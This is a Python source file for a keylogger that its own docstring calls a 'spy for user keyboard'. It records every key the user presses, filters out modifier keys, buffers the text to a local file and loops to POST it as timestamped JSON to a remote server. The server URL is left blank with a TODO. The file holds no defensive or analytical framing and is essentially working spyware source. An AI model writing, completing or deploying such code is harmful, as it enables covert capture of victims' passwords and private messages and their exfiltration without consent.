import keyboard
import time
from datetime import datetime
from threading import Thread
import json
import requests
import os


class KeyLogger():
    '''spy for user keyboard'''
    def __init__(self, filename):
        self.__log = []
        self.__keylogger_result = ''
        self.__file = filename

    def __log_pressed_keys(self, key):
        '''send data to log'''
        self.__log.append(key.name)

    def __listening_loop(self):
        '''listen key down'''
        keyboard.on_press(self.__log_pressed_keys)
        keyboard.wait()

    def __parse_log_loop(self):
        '''parse data from raw log, deleting special keys'''
        while True:
            black_list = ['shift', 'ctrl', 'backspace', 'alt', 'right', 'left', 'up', 'down'] # deleteing special keys
            copy_log = self.__log.copy()
            self.__log = []
            for i in copy_log:
                if i == 'space':
                    self.__keylogger_result += ' '
                elif i == 'enter':
                    self.__keylogger_result += '\n'
                elif not i in black_list:
                    self.__keylogger_result += i
            time.sleep(1)

    @staticmethod
    def __read_data_from_file(file):
        with open(file, 'r') as file:
            to_ret = file.read()
        return to_ret

    @staticmethod
    def __create_json_dict(data):
        '''create json dict with now date and some data'''
        now = datetime.now().isoformat()
        return json.dumps({now: data})

    @staticmethod
    def __write_to_file(data, file):
        '''write data from result to file'''
        with open(file, 'a') as f:
            f.write(data)

    def __send_to_server(self, data):
        '''send data in json format to server'''
        link = '' # TODO create server
        requests.post(link, {'data':self.__create_json_dict(data)})

    def __restore_data(self):
        '''restore data from file'''
        try:
            return self.__read_data_from_file(self.__file)
        except FileNotFoundError:
            return ''

    def __save_data(self):
        '''send data to sever, or saving it in file'''
        self.__keylogger_result = self.__restore_data()
        no_Internet = False
        while True:
            try:
                if no_Internet:
                    self.__send_to_server(self.__keylogger_result+self.__restore_data())
                    no_Internet = False
                    os.remove(self.__file)
                else:
                    self.__send_to_server(self.__keylogger_result)
            except:
                no_Internet = True
                self.__write_to_file(self.__keylogger_result, self.__file)
            finally:
                self.__keylogger_result = ''
            time.sleep(10)


    def mainloop(self):
        '''divide kelogger's logic to treads'''
        log_thread = Thread(target=self.__listening_loop, name='log')
        parse_log_tread = Thread(target=self.__parse_log_loop, name='parse')
        save_tread = Thread(target=self.__save_data, name='save')
        log_thread.start()
        parse_log_tread.start()
        save_tread.start()

        
if __name__ == "__main__":
    keylogger = KeyLogger('log.data')
    keylogger.mainloop()
